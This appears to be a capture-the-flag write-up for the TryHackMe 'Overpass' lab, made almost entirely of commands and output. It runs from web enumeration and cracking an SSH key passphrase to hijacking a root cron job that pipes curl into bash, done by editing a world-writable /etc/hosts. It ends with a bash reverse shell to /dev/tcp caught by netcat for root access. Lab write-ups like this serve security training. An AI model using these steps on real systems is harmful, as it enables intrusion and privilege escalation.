# TryHackMe Overpass writeup

> 原文: https://www.ctfiot.com/25437.html
> ID: 25437


```
gobuster dir -u http://10.10.83.171 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url: http://10.10.83.171
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/common.txt
[+] Status codes: 200,204,301,302,307,401,403
[+] User Agent: gobuster/3.0.1
[+] Timeout: 10s
===============================================================
2022/01/29 07:24:55 Starting gobuster
===============================================================
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
/index.html (Status: 301)
===============================================================
2022/01/29 07:24:56 Finished
===============================================================
async function postData(url = '', data = {}) {
 // Default options are marked with *
 const response = await fetch(url, {
 method: 'POST', // *GET, POST, PUT, DELETE, etc.
 cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
 credentials: 'same-origin', // include, *same-origin, omit
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded'
 },
 redirect: 'follow', // manual, *follow, error
 referrerPolicy: 'no-referrer', // no-referrer, *client
 body: encodeFormData(data) // body data type must match "Content-Type" header
 });
 return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
 return Object.keys(data)
 .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
 .join('&');
}
function onLoad() {
 document.querySelector("#loginForm").addEventListener("submit", function (event) {
 //on pressing enter
 event.preventDefault()
 login()
 });
}
async function login() {
 const usernameBox = document.querySelector("#username");
 const passwordBox = document.querySelector("#password");
 const loginStatus = document.querySelector("#loginStatus");
 loginStatus.textContent = ""
 const creds = { username: usernameBox.value, password: passwordBox.value }
 const response = await postData("/api/login", creds)
 const statusOrCookie = await response.text()
 if (statusOrCookie === "Incorrect credentials") {
 loginStatus.textContent = "Incorrect Credentials"
 passwordBox.value=""
 } else {
 Cookies.set("SessionToken",statusOrCookie)
 window.location = "/admin"
 }
}
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
...(omit)...
-----END RSA PRIVATE KEY-----
┌──(kali㉿kali)-[~/ctf]
└─$ wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
--2022-01-29 05:52:16-- https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:
443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8537 (8.3K) [text/plain]
Saving to: ‘ssh2john.py’

ssh2john.py 100%[================================================================>] 8.34K --.-KB/s in 0.004s

2022-01-29 05:52:16 (2.25 MB/s) - ‘ssh2john.py’ saved [8537/8537]
┌──(kali㉿kali)-[~/ctf]
└─$ python3 ssh2john.py id_rsa > rsa.hash
┌──(kali㉿kali)-[~/ctf]
└─$ john rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:
Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:
ASCII
james13 (key.private)
1g 0:00:00:03 DONE 3/3 (2022-01-29 06:21) 0.2777g/s 393498p/s 393498c/s 393498C/s jamest1..jamesey
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
$ chmod 400 id_rsa
$ ssh -i id_rsa james@10.10.17.22
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation: https://help.ubuntu.com
 * Management: https://landscape.canonical.com
 * Support: https://ubuntu.com/advantage

 System information as of Sat Jan 29 11:31:42 UTC 2022

 System load: 0.2 Processes: 92
 Usage of /: 22.3% of 18.57GB Users logged in: 0
 Memory usage: 12% IP address for eth0: 10.10.17.22
 Swap usage: 0%

47 packages can be updated.
0 updates are security updates.

Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ ls
todo.txt user.txt
james@overpass-prod:~$ cat user.txt
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
 Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
 They're not updating on the website
james@overpass-prod:~$ cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:
4EFC6QN.
//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
func rot47(input string) string {
[{"name":"System","pass":"saydrawnlyingpicture"}]
james@overpass-prod:~$ overpass
Welcome to Overpass
Options:
1 Retrieve Password For Service
2 Set or Update Password For Service
3 Delete Password For Service
4 Retrieve All Passwords
5 Exit
Choose an option: 4
System saydrawnlyingpicture
GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
echo "$(date -R) Builds completed" >> /root/buildStatus
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user command
17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
james@overpass-prod:~$ nslookup
> overpass.thm
Server: 127.0.0.53
Address: 127.0.0.53#53

Non-authoritative answer:
Name: overpass.thm
Address: 127.0.0.1
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:~$ ls -l /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27 2020 /etc/hosts
<AttackBoxのIP> overpass.thm
$ mkdir -p downloads/src
$ vi downloads/src/buildscript.sh
bash -i >& /dev/tcp/<AttackBoxのIP>/8000 0>&1
$ python3 -m http.server 80
...(omit)...
http server OSError: [Errno 98] Address already in use
$ ps -fA | grep python
$ kill xxxx
$ ssh root@10.10.94.66
...(omit)...
Last login: Sun Jan 30 19:35:55 on ttys002

The default interactive shell is now zsh.
To update your account to use zsh, please run `chsh -s /bin/zsh`.
For more details, please visit https://support.apple.com/kb/HT208050.
$ ssh root@10.10.94.66
The authenticity of host '10.10.94.66 (10.10.94.66)' can't be established.
ECDSA key fingerprint is SHA256:
canwcHIDVP3XvmtAH4/zdRgsCTrwKDt+Lv+YDuMi64E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.94.66' (ECDSA) to the list of known hosts.
root@10.10.94.66's password:

 _____ _ _ _ __ __
|_ _| __ _ _| | | | __ _ ___| | _| \/ | ___
 | || '__| | | | |_| |/ _` |/ __| |/ / |\/| |/ _ \
 | || | | |_| | _ | (_| | (__| <| | | | __/
 |_||_| \__, |_| |_|\__,_|\___|_|\_\_| |_|\___|
 |___/
root@ip-10-10-94-66:~# cat downloads/src/buildscript.sh
bash -i >& /dev/tcp/10.10.94.66/8000 0>&1
root@ip-10-10-94-66:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
root@ip-10-10-94-66:~# nc -lvnp 8000
Listening on [0.0.0.0] (family 0, port 8000)
10.10.104.176 - - [31/Jan/2022 06:33:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
Connection from 10.10.104.176 33150 received!
bash: cannot set terminal process group (17918): Inappropriate ioctl for device
bash: no job control in this shell
root@verpass-prod:~#
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
root@overpass-prod:~# cd /home/tryhackme
cd /home/tryhackme
root@overpass-prod:/home/tryhackme
# ls -a
ls -a
.
..
.bash_history
.bash_logout
.bashrc
.cache
.gnupg
.overpass
.profile
.sudo_as_admin_successful
go
resources
server
root@overpass-prod:/home/tryhackme
# cat .overpass
,LQ?2>6QiQ%CJw24<|6 $F3D4C:AE:@? r@56Q[QA2DDQiQ8>%sJ=QN.
[{"name":"TryHackMe Subscription Code","pass":"gmTDyl"}]
```
